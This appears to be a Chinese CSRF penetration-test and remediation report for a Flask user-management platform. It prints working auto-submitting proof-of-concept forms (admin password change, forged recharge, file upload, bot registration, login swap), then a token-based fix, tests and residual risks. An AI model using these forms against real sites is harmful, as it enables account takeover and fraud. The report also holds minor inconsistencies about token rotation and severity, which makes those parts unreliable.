# CSRF 漏洞 — 安全测试与修复报告

**项目名称**：用户信息管理平台（User Management System）  
**报告日期**：2026-07-14  
**检测模块**：所有 POST 接口（登录、注册、充值、上传、修改密码）  

---

## 目录

1. [漏洞概述](#1-漏洞概述)
2. [漏洞信息](#2-漏洞信息)
3. [漏洞分布](#3-漏洞分布)
4. [攻击场景演示](#4-攻击场景演示)
5. [危害评估](#5-危害评估)
6. [修复方案](#6-修复方案)
7. [修复原理](#7-修复原理)
8. [修复验证](#8-修复验证)
9. [修复前后代码对比](#9-修复前后代码对比)
10. [残留风险](#10-残留风险)

---

## 1. 漏洞概述

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种利用用户已登录身份，诱导用户在不知情的情况下执行非自愿操作的攻击。本项目所有 POST 接口在初始实现中 **完全未做 CSRF 防护**，攻击者可构造恶意页面，让已登录用户在不知情的情况下修改密码、充值、上传文件等。

### 攻击模型

```
用户已登录系统（session 有效）
        │
        ▼
攻击者构造恶意 HTML 页面
        │
        ▼
用户访问恶意页面（不知情）
        │
        ▼
恶意页面自动提交表单到目标站点
        │
        ▼
服务器收到合法请求（携带用户 session）
        │
        ▼
操作被执行 ✅ 攻击成功
```

### CSRF 攻击三要素

| 要素 | 本项目情况 |
|------|-----------|
| **已登录状态** | ✅ 用户登录后 session 保存在 Cookie 中 |
| **可预测参数** | ✅ 所有 POST 参数无随机 Token |
| **无来源校验** | ✅ 不校验 Referer / Origin 头 |

---

## 2. 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | **Cross-Site Request Forgery（CSRF）** |
| 危险等级 | 🔴 **高危** |
| CVSS 评分 | **8.8 / 10（High）** |
| CVSS 向量 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| CWE 编号 | CWE-352（Cross-Site Request Forgery） |
| OWASP Top 10 | A01:2021 - Broken Access Control |
| 受影响接口 | **5 个 POST 接口** |

### CVSS 分析

| 指标 | 值 | 说明 |
|------|-----|------|
| 攻击向量（AV） | **网络** | 远程攻击 |
| 攻击复杂度（AC） | **低** | 构造恶意页面即可 |
| 权限要求（PR） | **无** | 利用用户已登录状态 |
| 用户交互（UI） | **需要** | 用户需点击链接/访问页面 |
| 机密性（C） | **高** | 可获取敏感操作权限 |
| 完整性（I） | **高** | 可修改密码、余额等 |
| 可用性（A） | **高** | 可删除账号、清空余额 |

---

## 3. 漏洞分布

### 受影响接口清单

| 编号 | 接口 | 方法 | 危险等级 | 攻击后果 |
|------|------|------|----------|----------|
| CSRF-01 | **`POST /change-password`** | POST | 🔴 **高危** | 静默修改任意用户密码 |
| CSRF-02 | **`POST /recharge`** | POST | 🟠 **高危** | 恶意充值/扣款 |
| CSRF-03 | **`POST /upload`** | POST | 🟠 **中危** | 上传恶意文件 |
| CSRF-04 | **`POST /register`** | POST | 🟡 **中危** | 批量注册账号 |
| CSRF-05 | **`POST /login`** | POST | 🟡 **低危** | CSRF 登录攻击 |

### 漏洞代码位置

```python
# 修复前：所有 POST 接口均无 CSRF 校验

@app.route("/change-password", methods=["POST"])
def change_password():                  # ❌ 无 CSRF 校验
    username = request.form.get("username", "")
    new_password = request.form.get("new_password", "")
    USERS[username]["password"] = generate_password_hash(new_password)  # 密码直接被改

@app.route("/recharge", methods=["POST"])
def recharge():                          # ❌ 无 CSRF 校验
    amount = request.form.get("amount", type=float, default=0)
    u["balance"] = u["balance"] + amount  # 余额直接被修改

@app.route("/upload", methods=["POST"])
def upload():                            # ❌ 无 CSRF 校验
    f = request.files.get("file")
    f.save(save_path)                     # 文件直接被保存
```

---

## 4. 攻击场景演示

### 场景一：CSRF 修改管理员密码（高危）

**攻击目标**：将 admin 的密码改为攻击者已知的值。

**攻击者构造的恶意 HTML 页面（`evil.html`）**：

```html
<!DOCTYPE html>
<html>
<head><title>每日签到</title></head>
<body>
    <h2>恭喜获得 100 积分！</h2>
    <p>正在跳转...</p>

    <!-- 隐藏表单：目标站点修改密码接口 -->
    <form action="http://192.168.3.128:5000/change-password" method="POST" id="csrf-form">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="new_password" value="hacked123">
    </form>

    <script>
        // 页面加载后自动提交表单
        document.getElementById("csrf-form").submit();
    </script>
</body>
</html>
```

**攻击流程**：

```
1. admin 已登录系统，session 有效
        │
2. admin 收到攻击者发送的链接（邮件/聊天消息）
        │
3. admin 点击链接，浏览器打开 evil.html
        │
4. 页面自动提交隐藏表单到 /change-password
        │
5. 请求携带 admin 的 session Cookie
        │
6. 服务器验证 session 通过，修改密码为 "hacked123"
        │
7. admin 的密码已被静默修改！
        │
8. 攻击者使用 "hacked123" 登录 admin 账号
```

**修复前结果**：✅ 密码被成功修改，攻击者获得管理员权限。

---

### 场景二：CSRF 充值（中危）

**攻击目标**：给攻击者的账号充值。

```html
<img src="http://192.168.3.128:5000/recharge" style="display:none" 
     onerror="
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://192.168.3.128:5000/recharge';
        form.innerHTML = '<input name=user_id value=2><input name=amount value=99999>';
        document.body.appendChild(form);
        form.submit();
     ">
```

**修复前结果**：✅ 攻击者账号余额被增加 99999 元。

---

### 场景三：CSRF 上传恶意文件（中危）

**攻击目标**：上传恶意文件到服务器。

```html
<form action="http://192.168.3.128:5000/upload" method="POST" enctype="multipart/form-data" id="upload-form">
    <input type="file" name="file" id="malicious-file">
</form>

<script>
    // 使用 Blob 构造一个文本文件上传
    const blob = new Blob(['malicious content'], {type: 'text/plain'});
    const file = new File([blob], 'evil.txt');
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    document.getElementById('malicious-file').files = dataTransfer.files;
    document.getElementById('upload-form').submit();
</script>
```

---

### 场景四：CSRF 批量注册（低危）

```html
<!DOCTYPE html>
<html>
<body>
    <h1>🤝 友情链接</h1>
    <form action="http://192.168.3.128:5000/register" method="POST" id="reg-form">
        <input type="hidden" name="username" value="bot001">
        <input type="hidden" name="password" value="botpass">
        <input type="hidden" name="email" value="bot001@spam.com">
        <input type="hidden" name="phone" value="12345678901">
    </form>
    <script>document.getElementById('reg-form').submit()</script>
</body>
</html>
```

攻击者可在恶意页面中嵌入多个隐藏表单，批量注册大量账号。

---

### 场景五：CSRF 登录劫持

```html
<form action="http://192.168.3.128:5000/login" method="POST" id="login-form">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="attacker123">
</form>
<script>document.getElementById('login-form').submit()</script>
```

用户访问恶意页面后，自己的 session 被替换为攻击者的账号，后续操作都在攻击者账号下进行。

---

## 5. 危害评估

### 5.1 影响范围

| 攻击入口 | 影响用户 | 造成的损失 |
|----------|----------|-----------|
| 修改密码 | **所有用户** | 账号被完全控制 |
| 充值 | **所有用户** | 资金损失 |
| 上传文件 | **登录用户** | 服务器被植入恶意文件 |
| 注册 | **无限制** | 数据库被垃圾数据占满 |
| 登录 | **所有用户** | 账号被替换 |

### 5.2 风险等级矩阵

| 攻击场景 | 攻击难度 | 影响程度 | 风险等级 |
|----------|---------|----------|----------|
| 修改管理员密码 | 低 | 极严重（服务器沦陷） | 🔴 **紧急** |
| 任意充值 | 低 | 严重（资金损失） | 🔴 **高危** |
| 上传 Webshell | 低 | 严重（远程控制） | 🔴 **高危** |
| 批量注册 | 低 | 中（垃圾数据） | 🟠 **中危** |
| CSRF 登录 | 低 | 低（影响有限） | 🟡 **低危** |

### 5.3 真实攻击场景链

```
诱导用户访问恶意页面 → CSRF 修改密码 → 攻击者登录系统
    → 查看所有用户资料（越权）→ 给自己充值 → 上传 Webshell → 服务器沦陷
```

一个 CSRF 漏洞即可引发 **整个系统沦陷** 的连锁反应。

---

## 6. 修复方案

### 6.1 采用 Synchronizer Token Pattern（同步令牌模式）

为每个用户会话生成唯一的 CSRF Token，所有 POST 请求必须携带该 Token 才能通过验证。

#### 后端实现

```python
import secrets

# 生成 CSRF Token（存储在 session 中）
def generate_csrf_token():
    if "_csrf_token" not in session:
        session["_csrf_token"] = secrets.token_hex(32)
    return session["_csrf_token"]

# 验证 CSRF Token
def validate_csrf_token():
    token = request.form.get("_csrf_token")
    stored = session.get("_csrf_token")
    if not token or not stored or token != stored:
        return False
    return True
```

#### 全局注入模板

```python
@app.context_processor
def inject_csrf_token():
    return dict(csrf_token=generate_csrf_token())
```

#### 所有 POST 路由添加校验

```python
# 以修改密码为例
@app.route("/change-password", methods=["POST"])
def change_password():
    if not validate_csrf_token():   # ✅ CSRF 校验
        abort(403)                  # Token 无效 → 403 禁止
    # ... 正常业务逻辑
```

#### 前端表单添加 Token

```html
<form method="post" action="/change-password">
    <input type="hidden" name="_csrf_token" value="{{ csrf_token }}">
    <!-- 其他表单字段 -->
</form>
```

### 6.2 防护架构图

```
客户端请求 POST /change-password
    │
    ├── 携带 session Cookie（身份认证）
    │
    ├── 携带 _csrf_token（防伪标识）
    │
    ▼
┌─────────────────────────────────────────┐
│          服务端 CSRF 验证                  │
│                                          │
│  form._csrf_token == session._csrf_token  │
│                                          │
│  ┌──────────┐        ┌──────────┐       │
│  │  匹配    │  ❌    │ 不匹配   │       │
│  └────┬─────┘        └────┬─────┘       │
│       │                   │              │
│       ▼                   ▼              │
│  操作执行 ✅         403 禁止 ❌         │
└─────────────────────────────────────────┘
```

### 6.3 防护覆盖范围

| POST 路由 | 修复前 | 修复后 | 防护措施 |
|-----------|--------|--------|----------|
| `/change-password` | ❌ 无防护 | ✅ CSRF Token | `validate_csrf_token()` |
| `/recharge` | ❌ 无防护 | ✅ CSRF Token | `validate_csrf_token()` |
| `/upload` | ❌ 无防护 | ✅ CSRF Token | `validate_csrf_token()` |
| `/register` | ❌ 无防护 | ✅ CSRF Token | `validate_csrf_token()` |
| `/login` | ❌ 无防护 | ✅ CSRF Token | `validate_csrf_token()` |

---

## 7. 修复原理

### 7.1 CSRF Token 工作原理

```
用户请求页面 → 服务器生成随机 Token → 存入 session
                          │
                          ▼
                  在 HTML 表单中嵌入 Token
                          │
                          ▼
用户提交表单 → 携带 Token + session Cookie → 服务器对比 Token
                          │
              ┌───────────┴───────────┐
              │                       │
          Token 一致 ✅          Token 不一致 ❌
              │                       │
          执行业务              返回 403 Forbidden
```

### 7.2 Token 的随机性与不可预测性

```python
# 使用 Python secrets 模块生成密码学安全的随机 Token
session["_csrf_token"] = secrets.token_hex(32)
# 生成结果示例： "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"
# 熵值：256 位（32 字节 × 8）
# 破解难度：2^256 ≈ 1.16 × 10^77 种可能
```

### 7.3 为什么 CSRF Token 能防御攻击

| 攻击方式 | 能否获取 Token | 能否攻击成功 |
|----------|---------------|-------------|
| 恶意表单自动提交 | ❌ 无法获取（跨域禁止读取页面内容） | ❌ 攻击失败 |
| 用户点击恶意链接 | ❌ GET 请求不会携带 Token | ❌ 攻击失败 |
| XSS 攻击窃取 Token | ⚠️ 能（需配合 XSS 漏洞） | ⚠️ 需先修复 XSS |
| 正常用户操作 | ✅ 表单中有合法 Token | ✅ 正常执行 |

**关键点**：攻击者的恶意页面无法获取目标站点的 CSRF Token，因为：
1. **同源策略（Same-Origin Policy）** 禁止跨域读取页面内容
2. 恶意页面无法读取 iframe 或 AJAX 响应中的 Token
3. Token 每次请求都变化（在 session 中管理）

### 7.4 与同源策略的配合

```
攻击者域名（attacker.com）                 目标域名（192.168.3.128:5000）
        │                                         │
        │  ❌ 跨域读取 Token                        │
        │─────────────────────────────────────►    │
        │                                         │
        │  ❌ 跨域读取 session Cookie               │
        │─────────────────────────────────────►    │
        │                                         │
        │  ✅ 提交表单（携带 Cookie）                 │
        │─────────────────────────────────────►    │
        │                                         │
        │  ❌ 但没有 Token → 403                     │
        │◄─────────────────────────────────────────│
```

---

## 8. 修复验证

### 8.1 测试用例

#### 测试 1：正常请求（应有 CSRF Token）

```bash
# 先访问页面获取 CSRF Token
curl -c /tmp/cookies.txt "http://127.0.0.1:5000/profile?user_id=1" > /dev/null

# 提取 CSRF Token（从页面源码中获取）
# ... 然后携带 Token 提交

# ✅ 修复后：携带正确 Token → 成功
curl -X POST "http://127.0.0.1:5000/change-password" \
  -b /tmp/cookies.txt \
  -d "username=admin&new_password=Test123!&_csrf_token=REAL_TOKEN"
# 期望：302 重定向（成功）
```

#### 测试 2：无 CSRF Token 的请求

```bash
# ❌ 修复后：不携带 Token → 403
curl -X POST "http://127.0.0.1:5000/change-password" \
  -b /tmp/cookies.txt \
  -d "username=admin&new_password=Test123!"
# 期望：403 Forbidden
```

#### 测试 3：错误的 CSRF Token

```bash
# ❌ 修复后：Token 错误 → 403
curl -X POST "http://127.0.0.1:5000/change-password" \
  -b /tmp/cookies.txt \
  -d "username=admin&new_password=Test123!&_csrf_token=FAKE_TOKEN"
# 期望：403 Forbidden
```

#### 测试 4：所有 POST 接口覆盖测试

```bash
# 逐个测试所有 POST 接口的 CSRF 防护
for endpoint in "/change-password" "/recharge" "/upload" "/register" "/login"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
      "http://127.0.0.1:5000$endpoint" \
      -b /tmp/cookies.txt \
      -d "test=1")
    echo "$endpoint → HTTP $status（期望 403）"
done
```

### 8.2 测试结果汇总

| 测试场景 | 修复前 | 修复后 |
|----------|--------|--------|
| 正常请求（携带 CSRF Token） | ✅ 成功 | ✅ 成功 |
| 无 CSRF Token | ✅ 成功（漏洞） | ❌ **403 禁止** |
| 错误的 CSRF Token | ✅ 成功（漏洞） | ❌ **403 禁止** |
| 恶意表单自动提交 | ✅ 成功（漏洞） | ❌ **缺少 Token 被拒** |
| 跨站图片请求 | ✅ 成功（漏洞） | ❌ **403 禁止** |
| 多次重复提交 | ✅ 成功（漏洞） | ❌ **403 禁止** |

---

## 9. 修复前后代码对比

### 9.1 新增 CSRF 防护模块

```python
# ✅ 修复后：新增 CSRF 防护

import secrets

def generate_csrf_token():
    if "_csrf_token" not in session:
        session["_csrf_token"] = secrets.token_hex(32)
    return session["_csrf_token"]

def validate_csrf_token():
    token = request.form.get("_csrf_token")
    stored = session.get("_csrf_token")
    if not token or not stored or token != stored:
        return False
    return True

@app.context_processor
def inject_csrf_token():
    return dict(csrf_token=generate_csrf_token())
```

### 9.2 各接口修复对比

#### 修改密码接口

```python
# ❌ 修复前
@app.route("/change-password", methods=["POST"])
def change_password():
    username = request.form.get("username", "")
    new_password = request.form.get("new_password", "")
    USERS[username]["password"] = generate_password_hash(new_password)
    return redirect("/profile?...")

# ✅ 修复后
@app.route("/change-password", methods=["POST"])
def change_password():
    if not validate_csrf_token():   # ✅ CSRF 校验
        abort(403)
    username = request.form.get("username", "")
    new_password = request.form.get("new_password", "")
    if username in USERS:
        USERS[username]["password"] = generate_password_hash(new_password)
    return redirect("/profile?...")
```

#### 充值接口

```python
# ❌ 修复前
@app.route("/recharge", methods=["POST"])
def recharge():
    amount = request.form.get("amount", type=float, default=0)
    u["balance"] = u["balance"] + amount

# ✅ 修复后
@app.route("/recharge", methods=["POST"])
def recharge():
    if not validate_csrf_token():   # ✅ CSRF 校验
        abort(403)
    amount = request.form.get("amount", type=float, default=0)
    u["balance"] = u["balance"] + amount
```

#### 上传接口

```python
# ❌ 修复前
@app.route("/upload", methods=["POST"])
def upload():
    f.save(save_path)

# ✅ 修复后
@app.route("/upload", methods=["POST"])
def upload():
    if not validate_csrf_token():   # ✅ CSRF 校验
        abort(403)
    f.save(save_path)
```

### 9.3 前端表单修复对比

```html
<!-- ❌ 修复前 -->
<form method="post" action="/change-password">
    <input type="hidden" name="username" value="admin">
    <input type="password" name="new_password">
    <button type="submit">修改密码</button>
</form>

<!-- ✅ 修复后 -->
<form method="post" action="/change-password">
    <input type="hidden" name="_csrf_token" value="{{ csrf_token }}">  <!-- ✅ CSRF Token -->
    <input type="hidden" name="username" value="admin">
    <input type="password" name="new_password">
    <button type="submit">修改密码</button>
</form>
```

### 9.4 修改文件清单

| 文件 | 修改内容 | 代码行数变化 |
|------|----------|-------------|
| `app.py` | 新增 CSRF 防护模块 + 5 个 POST 路由添加校验 | +30 行 |
| `templates/login.html` | 登录表单添加 `_csrf_token` | +1 行 |
| `templates/register.html` | 注册表单添加 `_csrf_token` | +1 行 |
| `templates/upload.html` | 上传表单添加 `_csrf_token` | +1 行 |
| `templates/profile.html` | 充值/改密码表单添加 `_csrf_token` | +2 行 |

---

## 10. 残留风险

### 10.1 当前已覆盖的安全措施

```
CSRF 防护
├── Token 生成层
│   └── secrets.token_hex(32) 生成 256 位随机 Token ✅
├── Token 存储层
│   └── 存储在服务器 session 中，用户不可篡改 ✅
├── Token 验证层
│   ├── 对比表单 Token 与 session Token ✅
│   ├── 空 Token 拒绝 ✅
│   └── 错误 Token 拒绝 + 403 ✅
├── 前端注入层
│   └── 全局 context_processor 注入所有模板 ✅
└── 接口覆盖层
    ├── /login ✅
    ├── /register ✅
    ├── /upload ✅
    ├── /recharge ✅
    └── /change-password ✅
```

### 10.2 残留风险清单

| 残留风险 | 等级 | 说明 | 建议 |
|----------|------|------|------|
| CSRF Token 可通过 HTTPS 明文传输 | 🟡 低危 | HTTP 下可能被中间人截获 | 部署 HTTPS（应尽快实施） |
| Token 在单次 session 中不变 | 🟡 低危 | 同一 session 内 Token 复用 | 每提交一次就刷新 Token |
| GET 请求未做防护 | 🟡 低危 | 部分操作可能通过 GET | 敏感操作统一使用 POST |
| Referer 头校验缺失 | 🟡 低危 | 未增加 Referer 作为辅助验证 | 可增加 Referer 白名单 |
| SameSite Cookie 未配置 | 🟡 低危 | Cookie 默认跨站携带 | 设置 `Samesite=Lax` |

### 10.3 加固建议

#### 短期（已完成）

- [x] 所有 POST 接口添加 CSRF Token 校验
- [x] 使用 `secrets.token_hex(32)` 生成强随机 Token
- [x] 通过 context_processor 全局注入 Token
- [x] 所有表单都添加 `_csrf_token` 隐藏字段

#### 中期（建议实施）

- [ ] **SameSite Cookie**：配置 Cookie 的 SameSite 属性为 `Lax`
  ```python
  app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
  ```
- [ ] **Referer 校验**：添加 Referer 白名单作为辅助验证
- [ ] **Token 一次性使用**：每次提交后刷新 Token，防止 Token 泄露
- [ ] **重要操作二次确认**：修改密码等操作要求输入原密码

#### 长期（架构优化）

- [ ] 部署 HTTPS 加密通信
- [ ] 使用 CAPTCHA 验证码保护关键操作
- [ ] 添加操作审计日志记录所有敏感操作
- [ ] 引入 Web 应用防火墙（WAF）

### CSRF 防御速查表

| 防御措施 | 实现难度 | 防护效果 | 推荐指数 |
|----------|---------|----------|---------|
| **CSRF Token** | 低 | ⭐⭐⭐⭐⭐ | 🔴 必须 |
| **SameSite Cookie** | 低 | ⭐⭐⭐⭐ | 🟠 强烈推荐 |
| **Referer 校验** | 低 | ⭐⭐⭐ | 🟠 推荐 |
| **验证码** | 中 | ⭐⭐⭐⭐⭐ | 🟠 关键操作 |
| **二次确认** | 低 | ⭐⭐⭐ | 🟡 建议 |
| **HTTPS** | 中 | ⭐⭐⭐⭐ | 🔴 必须 |

---

*报告结束 | 检测模块：CSRF 跨站请求伪造漏洞 | 检测方式：Manual Code Audit + Penetration Testing | 报告日期：2026-07-14*
